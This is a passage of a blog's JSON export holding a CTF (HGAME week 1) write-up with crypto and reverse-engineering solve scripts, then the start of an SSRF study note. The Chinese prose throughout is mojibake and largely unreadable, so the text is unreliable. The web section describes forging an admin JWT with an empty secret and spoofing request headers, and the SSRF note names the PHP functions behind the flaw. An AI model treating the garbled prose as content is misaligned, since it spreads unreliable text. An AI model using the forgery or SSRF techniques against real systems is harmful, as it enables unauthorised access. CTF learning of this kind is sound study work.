up","slug":"ã€hgame-week1ã€‘write-up","date":"2022-01-28T14:32:55.000Z","updated":"2022-01-28T14:33:33.672Z","comments":true,"path":"2022/01/28/ã€hgame-week1ã€‘write-up/","link":"","permalink":"http://example.com/2022/01/28/%E3%80%90hgame-week1%E3%80%91write-up/","excerpt":"å‰è¨€hgameå¼€èµ›äº†ï¼Œç¬¬ä¸€å‘¨çš„é¢˜æ¯”è¾ƒç®€å•ï¼Œè§£äº†å¤§éƒ¨åˆ†éäºŒè¿›åˆ¶å’Œå°‘éƒ¨åˆ†äºŒè¿›åˆ¶ï¼Œä¼°è®¡ç¬¬äºŒå‘¨å°±ä¸å¥½è¿‡äº†ã€‚","text":"å‰è¨€hgameå¼€èµ›äº†ï¼Œç¬¬ä¸€å‘¨çš„é¢˜æ¯”è¾ƒç®€å•ï¼Œè§£äº†å¤§éƒ¨åˆ†éäºŒè¿›åˆ¶å’Œå°‘éƒ¨åˆ†äºŒè¿›åˆ¶ï¼Œä¼°è®¡ç¬¬äºŒå‘¨å°±ä¸å¥½è¿‡äº†ã€‚ CRYPTODancing Lineç»™äº†å¼ å›¾ç‰‡ï¼Œé‡Œé¢æ˜¯å¼¯å¼¯æ›²æ›²çš„çº¿ï¼š ä»¥å³ä¸Šè§’çš„é»‘è‰²åƒç´ ç‚¹ä¸ºå¼€å¤´ï¼Œæ¯ä¸ªåƒç´ ä¸‹ä¸€ä½å‘å³èµ°åˆ™å–0ï¼Œå‘å·¦èµ°åˆ™å–1ï¼Œæå–äºŒè¿›åˆ¶ç ï¼š 101101000 01100111 01100001 01101101 01100101 01111011 01000100 01100001 01101110 01100011 00110001 01101110 01100111 01011111 01001100 00110001 01101110 01100101 01011111 00110001 00110101 01011111 01100110 01110101 01101110 00101100 01011111 00110001 00110101 01101110 00100111 01110100 01011111 00110001 01110100 00111111 01111101 ç„¶åè½¬æˆå­—ç¬¦å°±æ˜¯flagäº†ï¼š Easy RSAåˆ†æä»£ç ï¼š 123456789101112131415161718from math import gcdfrom random import randintfrom gmpy2 import next_primefrom Crypto.Util.number import getPrimefrom secret import flagdef encrypt(c): p = getPrime(8) q = getPrime(8) e = randint(0, p * q) while gcd(e, (p - 1) * (q - 1)) != 1: e = int(next_prime(e)) return e, p, q, pow(ord(c), e, p * q)if __name__ == &#x27;__main__&#x27;: print(list(map(encrypt, flag))) # [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] éšæœºè·å–ä¸¤ä¸ªè´¨æ•°ï¼Œç„¶åè·å–ä¸€ä¸ªèŒƒå›´åœ¨0åˆ°nä¹‹é—´ï¼Œå¹¶ä¸phiäº’è´¨çš„eï¼Œå¹¶ä¸”è¿”å›e, p, q, pow(ord(c), e, p * q)ã€‚æ ¹æ®åˆ†æï¼Œæˆ‘ä»¬ç¼–å†™è„šæœ¬ï¼š 1234567891011import libnumlist=[[12433, 149, 197, 104], [8147, 131, 167, 6633], [10687, 211, 197, 35594], [19681, 131, 211, 15710], [33577, 251, 211, 38798], [30241, 157, 251, 35973], [293, 211, 157, 31548], [26459, 179, 149, 4778], [27479, 149, 223, 32728], [9029, 223, 137, 20696], [4649, 149, 151, 13418], [11783, 223, 251, 14239], [13537, 179, 137, 11702], [3835, 167, 139, 20051], [30983, 149, 227, 23928], [17581, 157, 131, 5855], [35381, 223, 179, 37774], [2357, 151, 223, 1849], [22649, 211, 229, 7348], [1151, 179, 223, 17982], [8431, 251, 163, 30226], [38501, 193, 211, 30559], [14549, 211, 151, 21143], [24781, 239, 241, 45604], [8051, 179, 131, 7994], [863, 181, 131, 11493], [1117, 239, 157, 12579], [7561, 149, 199, 8960], [19813, 239, 229, 53463], [4943, 131, 157, 14606], [29077, 191, 181, 33446], [18583, 211, 163, 31800], [30643, 173, 191, 27293], [11617, 223, 251, 13448], [19051, 191, 151, 21676], [18367, 179, 157, 14139], [18861, 149, 191, 5139], [9581, 211, 193, 25595]]flag = &#x27;&#x27;for e,p,q,c in list: n = p*q phi = (p-1)*(q-1) d = libnum.invmod(e,phi) flag += chr(pow(c,d,n))print(flag) è·å–flagï¼š Matryoshkaå¯†ç å¥—å¨ƒï¼Œä¸€å¼€å§‹ç»™çš„æ˜¯ç›²æ–‡ï¼ŒæŸ¥è¯¢è½¬åŒ–è¡¨ï¼š å‘ç°è½¬åŒ–å‡ºæ¥æ‘©å°”æ–¯å¯†ç ï¼š 1..-/--.../--..--/-----/--.../--..--/---../...--/--..--/.-../....-/--..--/..---/....-/--..--/..---/--.../--..--/.-.-/-..../--..--/...-/....-/--..--/....-/--.../--..--/---../...../--..--/---../--.../--..--/...-/-..../--..--/---../...--/--..--/.----/--.../--..--/--.../...--/--..--/...-/....-/--..--/-./....-/--..--/----./--.../--..--/--.../...../--..--/..-/-..../--..--/.-../....-/--..--/.----/--.../--..--/./-..../--..--/----./...../--..--/---../...--/--..--/.----/--.../--..--/..-/....-/--..--/...-/....-/--..--/.----/...--/--..--/.-.-/....-/--..--/--.../...../--..--/-..../....-/--..--/--.../....-/--..--/-----/--.../--..--/./-..../--..--/.----/....-/--..--/-..../--.../--..--/-----/...--/--..--/---../--.../--..--/..---/...../--..--/....-/--.../--..--/.-.-/-..../--..--/-..../...--/--..--/.----/...../--..--/.----/....-/--..--/--.../...--/--..--/--.../--.../--..--/-..../-..../--..--/....-/--.../--..--/--.../...--/--..--/.-.-/-..../--..--/..-/....-/--..--/./....-/--..--/....-/-..../--..--/...../-..../--..--/....-/....-/--..--/...../...--/--..--/---../-..../--..--/....-/....-/--..--/....-/-.... ä½†æ˜¯ç›´æ¥è§£å¯†åæ— æ³•ç»§ç»­è§£å¯†ï¼Œå°è¯•é€†åºæ‘©å°”æ–¯ç ï¼Œç¼–å†™è„šæœ¬ï¼š 1234def strReverse(strDemo): return strDemo[::-1] print(strReverse(&#x27;..-/--.../--..--/-----/--.../--..--/---../...--/--..--/.-../....-/--..--/..---/....-/--..--/..---/--.../--..--/.-.-/-..../--..--/...-/....-/--..--/....-/--.../--..--/---../...../--..--/---../--.../--..--/...-/-..../--..--/---../...--/--..--/.----/--.../--..--/--.../...--/--..--/...-/....-/--..--/-./....-/--..--/----./--.../--..--/--.../...../--..--/..-/-..../--..--/.-../....-/--..--/.----/--.../--..--/./-..../--..--/----./...../--..--/---../...--/--..--/.----/--.../--..--/..-/....-/--..--/...-/....-/--..--/.----/...--/--..--/.-.-/....-/--..--/--.../...../--..--/-..../....-/--..--/--.../....-/--..--/-----/--.../--..--/./-..../--..--/.----/....-/--..--/-..../--.../--..--/-----/...--/--..--/---../--.../--..--/..---/...../--..--/....-/--.../--..--/.-.-/-..../--..--/-..../...--/--..--/.----/...../--..--/.----/....-/--..--/--.../...--/--..--/--.../--.../--..--/-..../-..../--..--/....-/--.../--..--/--.../...--/--..--/.-.-/-..../--..--/..-/....-/--..--/./....-/--..--/....-/-..../--..--/...../-..../--..--/....-/....-/--..--/...../...--/--..--/---../-..../--..--/....-/....-/--..--/....-/-....&#x27;)) ç»“æœï¼š 1....-/-..../--..--/-..../-..../--..--/....-/..---/--..--/--.../...../--..--/-..../-..../--..--/....-/...../--..--/....-/-..../--..--/-...././--..--/-..../-../--..--/....-/-.-./--..--/--.../...--/--..--/...--/-..../--..--/....-/....-/--..--/...--/...--/--..--/--.../...--/--..--/-..../----./--..--/...../----./--..--/--.../....-/--..--/....-/-.-./--..--/...--/-..../--..--/...../---../--..--/...--/..---/--..--/--.../-----/--..--/...--/....-/--..--/-..../----./--..--/....-/./--..--/...--/-----/--..--/-..../...--/--..--/-..../....-/--..--/...../...--/--..--/-..../-.-./--..--/--.../----./--..--/-..../-.../--..--/-..../-../--..--/...--/----./--..--/--.../..---/--..--/...../.----/--..--/....-/./--..--/...--/----./--..--/-..../..-./--..--/....-/-../--..--/...../...--/--..--/...--/.----/--..--/-..../.-/--..--/-..../-.../--..--/--.../...--/--..--/...--/----./--..--/--.../..---/--..--/....-/-.../--..--/...--/..---/--..--/...../..---/--..--/...--/-..../--..--/-..../-.../--..--/....-/-.-./--..--/...--/---../--..--/-..../---../--..--/-..../..-./--..--/--.../..---/--..--/...--/-----/--..--/...--/-.. è§£å¯†å¾—åˆ°ï¼š 146,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D å‘ç°æ˜¯åå…­è¿›åˆ¶ç ï¼Œè½¬åŒ–å­—ç¬¦ä¸²ï¼š 1FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0= ç–‘ä¼¼base64ç ï¼Œä½†ä¸èƒ½ç›´æ¥è½¬æ¢ï¼Œæç¤ºæœ‰è¯´æ˜å‡¯æ’’ä»¥åŠç»´å‰å°¼äºšï¼Œç»è¿‡åå¤å°è¯•åº”è¯¥æ˜¯ç»´å‰å°¼äºšå¯†ç ï¼Œå¯†é’¥ä¸ºhgameï¼š 1YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0= base64è§£å¾—ï¼š 1c0bmvghyz_&#123;0Raz_gxxm0thkzo_0ob0m_vokcczt_!r&#125; è¿™é‡Œå†è·‘ä¸€æ¬¡å‡¯æ’’ï¼Œä½æ•°ä¸º21ï¼š 1h0gralmde_&#123;0Wfe_lccr0ympet_0tg0r_atphhey_!w&#125; è§‚å¯Ÿå¾—åˆ°åº”è¯¥å…ˆå–å¥‡æ•°ä½ï¼Œå†å–å¶æ•°ä½ï¼Œè§£å¾—flagï¼š 1hgame&#123;Welc0me_t0_the_w0rld_0f_crypt0graphy!&#125; English Novelé™„ä»¶ç»™äº†å¾ˆå¤šä¸œè¥¿ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥çœ‹encrypt.pyæ–‡ä»¶ï¼š 1234567891011def encrypt(data, key): assert len(data) &lt;= len(key) result = &quot;&quot; for i in range(len(data)): if data[i].isupper(): result += chr((ord(data[i]) - ord(&#x27;A&#x27;) + key[i]) % 26 + ord(&#x27;A&#x27;)) elif data[i].islower(): result += chr((ord(data[i]) - ord(&#x27;a&#x27;) + key[i]) % 26 + ord(&#x27;a&#x27;)) else: result += data[i] return result åˆ†æé€»è¾‘ï¼Œå¦‚æœä¸ºå¤§å†™æˆ–å°å†™å­—æ¯ï¼Œåˆ™å‡¯æ’’ä½ç§»keyä½ï¼Œå¦åˆ™ä¸ä½ç§»ã€‚é‚£ä¹ˆflag.encä¸­çš„å¯†æ–‡åº”è¯¥ä¹Ÿæ˜¯ç”±è¿™ä¸ªé€»è¾‘å¾—åˆ°çš„ã€‚æ¥ç€æˆ‘ä»¬è¦å¯¹æ¯”å°è¯´çš„æ˜æ–‡ä¸å¯†æ–‡ï¼Œç®—å‡ºå¯¹åº”çš„keyå€¼ï¼Œä½†æ˜¯ç”±äºpartè¢«æ‰“ä¹±äº†ï¼Œå› æ­¤è¦æ‰¾å‡ºå¯¹åº”çš„æ–‡ä»¶ï¼Œä¸€ç•ªæŸ¥æ‰¾æ‰¾åˆ°æ˜æ–‡çš„part0ä¸å¯†æ–‡çš„part175å¯¹åº”ã€‚ æ¥ç€æˆ‘ä»¬å†™è„šæœ¬è®¡ç®—keyå€¼å¹¶è§£å‡ºflagï¼Œæ³¨æ„æ¢è¡Œç¬¦ä¹Ÿæ˜¯è¦å ä¸€ä½çš„ï¼Œè„šæœ¬ä¸­æˆ‘ç”¨ç©ºæ ¼ä»£æ›¿ï¼š 1234567891011121314151617181920str1=&#x27; read: &quot;\\&#x27;Alfred Simmonds, Horse Slaughterer and Glue Boiler, Willingdon. Dealer in Hides and Bone-Meal. Kennels Supplied.\\&#x27; Do you not understand what that means? They are taking Boxer to the knacker\\&#x27;s!&quot;A cry of horror burst from all the animals. At this moment the man on the box whipped up his horses and the van moved out of the yard at a smart trot. All the animals followed, crying out at the tops of thei&#x27;str2=&#x27; wwme: &quot;\\&#x27;Lmgzwq Vugmtxht, Hbnvd Shzdheysfhu avv Glpl Wucual, Akmfcmxtem. Xyvuwb ss Rijwr lhm Eltt-Zumi. Xqrthdl Lrriyiwi.\\&#x27; Kq zce nlf fnuypymqae wuws zaoo elyzl? Cikw rev dpfwpk Xuytf to iue eupktlv\\&#x27;o!&quot;E cmy oj kkxxuz xxqrf blzi xsm oki pfrfaeq. Uu wnqq fzeuiv yna lhh mr qnv etj ixrasdl jv ugo haknkf bxd vdi vpk nvoui ofi xv grj smrb fk q npnoi rehx. Qlf cxn mpmiair jgnyzqvd, zxdlaj qjk wi khf ltee cf tric&#x27;fakestr=&quot;klsyf&#123;W0_j0v_ca0z_&#x27;Ks0ao-bln1qstxp_juqfqy&#x27;?&#125;&quot;flag = &#x27;&#x27;key = [None]*420list1=list(str1)list2=list(str2)fake=list(fakestr)for i in range(0,400): key[i] = ord(list1[i])-ord(list2[i])for j in range(0,44): if fake[j].isupper(): flag += chr((ord(fake[j]) - ord(&#x27;A&#x27;) + key[j]) % 26 + ord(&#x27;A&#x27;)) elif fake[j].islower(): flag += chr((ord(fake[j]) - ord(&#x27;a&#x27;) + key[j]) % 26 + ord(&#x27;a&#x27;)) else: flag += fake[j]#print(key)print(flag) è¦æ³¨æ„ï¼Œç”±äºæœ‰éƒ¨åˆ†ä½æ˜¯éå­—æ¯å­—ç¬¦ï¼Œå› æ­¤é‚£äº›ä½çš„keyæ— æ³•è®¡ç®—ï¼Œæ‰€ä»¥æˆ‘ä»¬è·‘å‡ºæ¥çš„flagä¹Ÿä¸æ˜¯æœ€ç»ˆflagï¼š ä¸è¿‡è¿™ä¸ªflagè¿˜æ˜¯æ¯”è¾ƒå¥½çŒœçš„ï¼Œâ€œä½ çŸ¥é“â€˜æ˜æ–‡æ”»å‡»â€™å—ï¼Ÿâ€ï¼Œå› æ­¤å¾—å‡ºflagï¼š 1hgame&#123;D0_y0u_kn0w_&#x27;Kn0wn-pla1ntext_attack&#x27;?&#125; IoTç¬¬ä¸€å‘¨IoTå°±ä¸€é¢˜ï¼Œè¿˜æ˜¯çº¯é€åˆ†ã€‚ç›´æ¥æŠŠæ–‡ä»¶æ‹–å…¥IDAå°±èƒ½æ‰¾åˆ°flagäº†ï¼š MISCæ¬¢è¿æ¬¢è¿ï¼çƒ­çƒˆæ¬¢è¿ï¼ç­¾åˆ°é¢˜ã€‚ è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦é™„ä»¶ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé¦–å…ˆæç¤ºæˆ‘ä»¬6ä½å¯†ç ï¼Œå› æ­¤ç›´æ¥çˆ†ç ´ï¼š æ¥ç€ç»™äº†ç¬¬äºŒä¸ªå‹ç¼©åŒ…ï¼Œä¸€ä¸ªæç¤ºå’Œä¸€ä¸ªå­—å…¸ï¼Œæ ¹æ®æç¤ºè¿™é‡Œæ˜¯å­—å…¸çˆ†ç ´ï¼š æ¥ç€ç»™äº†ç¬¬ä¸‰ä¸ªå‹ç¼©åŒ…å’Œä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”è¾ƒå‘ç°è¿™ä¸ªæ–‡ä»¶å’Œç¬¬ä¸‰ä¸ªå‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ä¸€è‡´ï¼Œå› æ­¤æ˜¯æ˜æ–‡ç ´è§£ï¼š æ¥ç€æ‰“å¼€æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œbinwalkå‘ç°è—æœ‰å‹ç¼©åŒ…ï¼Œå› æ­¤è¿›è¡Œåˆ†ç¦»ï¼š è¿™ä¸ªå‹ç¼©åŒ…ä¸­åªæœ‰ä¸€å¼ åŠ å¯†çš„å›¾ç‰‡ï¼Œå› æ­¤çŒœæµ‹ä¼ªåŠ å¯†ï¼Œæ›´æ”¹hexï¼ŒæˆåŠŸè·å–flagå›¾ç‰‡ï¼š å¥½åº·çš„æµé‡æ‰“å¼€æµé‡åŒ…ç›´æ¥è¿½è¸ªTCPæµï¼Œå‘ç°base64è¡¨ç¤ºçš„å›¾ç‰‡ï¼š é€šè¿‡base64è·å–å›¾ç‰‡ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç½‘ç«™ï¼šbase64è½¬å›¾ç‰‡ æ¥ç€æŠŠå›¾æ‰”è¿›stegsloveä¸­ï¼Œåœ¨å…¶ä¸­ä¸€ä¸ªé€šé“å‘ç°æ¡å½¢ç ï¼Œæ‰«ææ¡å½¢ç è·å–ä¸€åŠflagï¼š åœ¨æµé‡åŒ…ä¸­è§£base64ç å¯ä»¥å¾—åˆ°LSBçš„æç¤ºï¼Œä¹Ÿå¯ä»¥ç›´æ¥çŒœï¼Œå¦ä¸€åŠflagå°±è—åœ¨LSBä¸­ï¼š ç»„åˆæˆflagï¼š 1hgame&#123;ez_1mg_Steg4n0graphy&#125; ç¾¤é’(å…¶å®æ˜¯å¹½çµä¸œäº¬ï¼‰ä¸‹è½½é™„ä»¶æ˜¯ä¸€æ®µéŸ³é¢‘ï¼Œå¹½çµä¸œäº¬æ˜¯çœŸçš„å¥½å¬ï¼ŒæŸ¥çœ‹å±æ€§å‘ç°æç¤ºï¼š æŠŠéŸ³é¢‘æ”¾åœ¨SilentEyeä¸­è§£å¯†ä½†æ˜¯æ²¡æœ‰è§£å‡ºæ¥ï¼ŒçŒœæµ‹éœ€è¦å¯†ç ï¼ŒæŸ¥çœ‹éŸ³é¢‘çš„æ³¢å½¢å›¾æ‰¾åˆ°å¯†ç å¹¶æˆåŠŸè§£å¯†ï¼š è¿›å…¥é“¾æ¥ä¸‹è½½ç¬¬äºŒä¸ªé™„ä»¶ï¼Œåå­—å«sstvï¼Œç™¾åº¦æœç´¢ä¸€ä¸‹å‘ç°æ˜¯æ…¢æ‰«æç”µè§†ï¼Œåœ¨æ‰‹æœºä¸Šä¸‹è½½robot36ï¼Œæ‰“å¼€è½¯ä»¶æ’­æ”¾éŸ³é¢‘å¾—åˆ°å›¾ç‰‡ï¼Œæ‰«æäºŒç»´ç å³å¯å¾—åˆ°flagï¼š PWNtest_your_ncå‡ºé¢˜äººç…è´¹è‹¦å¿ƒå°±ä¸ºäº†é€æˆ‘ä»¬è¿™1åˆ†ï¼Œå¤ªæ„ŸåŠ¨äº†ï¼Œç›´æ¥ç›‘å¬å°±è¡Œäº†ï¼š REVERSEeasyasmå¬é˜Ÿå‹è¯´è¿™é¢˜å’Œå®‰å“é€†å‘éƒ½å¾ˆç®€å•ï¼Œæˆ‘å°±å»åšäº†ã€‚è¿™é¢˜è¦æˆ‘ä»¬ç”Ÿå•ƒæ±‡ç¼–ææ‡‚é€»è¾‘ï¼Œå…ˆçœ‹ä»£ç ï¼š å®¡è®¡ä»£ç ï¼Œé€»è¾‘å°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å·¦ç§»4ä½çš„å€¼ä¸å³ç§»å››ä½çš„å€¼ç›¸åŠ ï¼Œå†ä¸0x17åšä¸€æ¬¡å¼‚æˆ–ï¼Œå¹¶å°†è¿™ä¸ªå­—ç¬¦ä¸ä¸Šé¢é‚£å¼ å›¾çš„åå…­è¿›åˆ¶æ¯”è¾ƒï¼Œæ¯ä¸€ä½éƒ½ç›¸ç­‰å°±è¾“å‡ºrightã€‚æ ¹æ®é€»è¾‘ç¼–å†™è„šæœ¬è®¡ç®—flagï¼š 1234567list=[0x91,0x61,0x1,0xc1,0x41,0xa0,0x60,0x41,0xd1,0x21,0x14,0xc1,0x41,0xe2,0x50,0xe1,0xe2,0x54,0x20,0xc1,0xe2,0x60,0x14,0x30,0xd1,0x51,0xc0,0x17]flag = &#x27;&#x27;for i in list: xor = i^0x17 flag += chr((xor&gt;&gt;4) + ((xor&amp;0x0f)&lt;&lt;4))print(flag) creakmeæŠŠæ–‡ä»¶æ‹–å…¥IDAå®¡è®¡ä»£ç ï¼š åˆ†æé€»è¾‘ï¼Œå°±æ˜¯å°†è¾“å…¥çš„æ˜æ–‡æ¯æ¬¡å–8ä½ï¼Œå‰4ä½ä¸ºv2ï¼Œå4ä½ä¸ºv3ï¼Œå¹¶è¿›è¡Œå¦‚å›¾æ‰€ç¤ºçš„32æ¬¡å¾ªç¯åŠ å¯†ï¼Œç”Ÿæˆå¯†æ–‡ã€‚ä¸è¿‡ç”±äºå¾ªç¯äº†32æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡å¾ªç¯32æ¬¡å°±ç›¸å½“äºè§£å¯†å›å»äº†ã€‚ç¼–å†™è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233import binasciiv0: int = 0f1=&#x27;65E0F2E3CF9284AABA5A126DAE1FEDE6ED9CE5ED52EB78C2030C144C48D93488&#x27;t2=0w1=0flag=b&#x27;&#x27;v7 = int(b&#x27;DCBA&#x27;.hex(), 16)v8 = int(b&#x27;HGFE&#x27;.hex(), 16)v9 = int(b&#x27;LKJI&#x27;.hex(), 16)v10 = int(b&#x27;PONM&#x27;.hex(), 16)while w1&lt;4: v3 =int(f1[t2:t2+8], 16) v2 =int(f1[t2+8:t2 + 16], 16) t2+=16 w1+=1 v4 = 32 # print(f&#x27;&#123;v2:x&#125;,&#123;v3:x&#125;&#x27;) while v4 &gt; 0: v0 = (v4 * 305419896) &amp; 0x00000000ffffffff v3 -= v0 ^ (v0 + v2) ^ (v7 + ((v2 &lt;&lt; 4) &amp; 0x00000000ffffffff)) ^ (v8 + ((v2 &amp; 0x00000000ffffffe0) &gt;&gt; 5)) v3 = v3 &amp; 0x00000000ffffffff v2 -= v0 ^ (v0 + v3) ^ (v9 + ((v3 &lt;&lt; 4) &amp; 0x00000000ffffffff)) ^ (v10 + ((v3 &amp; 0x00000000ffffffe0) &gt;&gt; 5)) v2 = v2 &amp; 0x00000000ffffffff v4 -= 1 if v3 != 0: flag+= binascii.a2b_hex(hex(v3)[2:10]) if v2 != 0: flag += binascii.a2b_hex(hex(v2)[2:10])print(flag[::-1])# flag=bytes(v2) Flag CheckeræŠŠapkæ‰”è¿›jebé‡Œåç¼–è¯‘ï¼Œåˆ†æjavaä»£ç ï¼š åŠ å¯†é€»è¾‘çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œå…¶å®ç®€å•è¯´å°±æ˜¯ä»¥v0ä¸ºå¯†é’¥å¯¹v4è¿›è¡ŒRC4åŠ å¯†ï¼Œæ¯”è¾ƒç»“æœæ˜¯å¦ä¸å¯†æ–‡ç›¸ç­‰ï¼Œè€Œv4çš„å€¼å°±æ˜¯flagï¼Œå› æ­¤ç›´æ¥è§£å¯†RC4å°±å¯ä»¥äº†ï¼š WEBeasy_authè¿™é¢˜æŒºç¥å¥‡çš„ï¼Œåå­—å«å¼±å£ä»¤ï¼Œç»“æœå’Œå¼±å£ä»¤ä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ã€‚è¿™é¢˜çš„å®è´¨æ˜¯ä¼ªé€ jwtï¼Œå…³äºjwtæˆ‘ä¹‹å‰ä»‹ç»tokençš„åšå®¢ä¹Ÿå†™è¿‡äº†ã€‚å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ï¼Œç™»å½•æ—¶æŠ“åŒ…å‘ç°tokenï¼š ä¼ªé€ çš„æ—¶å€™å‘ç°æ²¡æœ‰secretï¼Œå› æ­¤å¯†é’¥ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ªé€ ä¸­é—´é‚£ä¸€éƒ¨åˆ†å°±è¡Œäº†ï¼Œidæ”¹ä¸º1ï¼Œåç§°æ”¹ä¸ºadminï¼š æœ€ååœ¨æœ¬åœ°å‚¨å­˜ä¸­æ›´æ”¹tokenï¼Œåˆ·æ–°é¡µé¢æ‹¿åˆ°flagï¼š è››è››â€¦å˜¿å˜¿â™¥æˆ‘çš„è››è››ä¸ä¼šå†™è„šæœ¬ï¼Œå¾ˆéº»ï¼Œæ‰‹ç‚¹åˆ°100å…³çš„ï¼Œç­‰wpå‡ºäº†ç ”ç©¶ä¸‹ã€‚ Tetris plusæ¸¸æˆå…³10%æ”¹åˆ†ï¼Œ90%è—jsé‡Œï¼Œè¿™é¢˜å¾ˆæ˜¾ç„¶è—åœ¨jsé‡Œã€‚æ£€æŸ¥jsï¼Œå‘ç°å¯ç–‘ç›®æ ‡ï¼š ç¿»é˜…å‘ç°jsfuckï¼Œè§£ç å¾—åˆ°flagï¼š Fujiwara Tofu Shopç»å…¸çš„æ›´æ”¹è¯·æ±‚å¤´çš„é¢˜ç›®ï¼Œè€ƒå¯Ÿhttpåè®®ï¼Œè¿™é‡Œå°±ç›´æ¥æ”¾æœ€åçš„å¤´æ–‡ä»¶äº†ã€‚è¦æ³¨æ„æœ€åè¿›è¡Œä¼ªé€ æœ¬åœ°è¯·æ±‚æ—¶ï¼Œä¸è¦ç”¨xffï¼Œå¦åˆ™ä½ ä¼šå¾—åˆ°å‡ºé¢˜äººçˆ±çš„å…³æ€€ï¼š","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ssrfçš„å­¦ä¹ ","slug":"ssrfçš„å­¦ä¹ ","date":"2022-01-25T03:20:12.000Z","updated":"2022-01-26T11:31:57.039Z","comments":true,"path":"2022/01/25/ssrfçš„å­¦ä¹ /","link":"","permalink":"http://example.com/2022/01/25/ssrf%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"å‰è¨€åšé¢˜çš„æ—¶å€™ç¢°åˆ°äº†æŒºå¤šçš„ssrfç±»å‹çš„é¢˜ç›®ï¼Œè¿™é‡Œåšä¸€ä¸ªå­¦ä¹ æ€»ç»“ã€‚","text":"å‰è¨€åšé¢˜çš„æ—¶å€™ç¢°åˆ°äº†æŒºå¤šçš„ssrfç±»å‹çš„é¢˜ç›®ï¼Œè¿™é‡Œåšä¸€ä¸ªå­¦ä¹ æ€»ç»“ã€‚ ä»€ä¹ˆæ˜¯ssrfSSRFï¼ˆServer-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆå¹¶ç”±æœåŠ¡ç«¯å‘èµ·æ¶æ„è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚è¿›è¡ŒSSRFçš„ç›®çš„ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡æœåŠ¡ç«¯æ¥æ”»å‡»é»‘å®¢æ— æ³•ç›´æ¥è®¿é—®çš„å†…ç½‘ç³»ç»Ÿã€‚å¤§è‡´æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æœåŠ¡å™¨Aä¸ºwebæœåŠ¡å™¨ï¼Œå¯ä»¥è¢«æ”»å‡»è€…è®¿é—®ï¼Œè€Œä¸»æœºBä½œä¸ºå†…ç½‘ä¸­å…¶ä»–æœåŠ¡å™¨æ— æ³•è¢«è®¿é—®ã€‚å¦‚æœæ­¤æ—¶æœåŠ¡å™¨Aä¸­çš„webæœåŠ¡å­˜åœ¨ssrfæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æœåŠ¡å™¨Aå‘é€è¯·æ±‚å¤´è¿›è¡Œæ¬ºéª—ï¼Œè¾¾åˆ°è·å–ä¸»æœºBå†…å®¹çš„ç›®çš„ã€‚ æ¼æ´äº§ç”ŸåŸå›  file_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚ readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚ fsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ã€‚ curl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚ fopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URLã€‚ 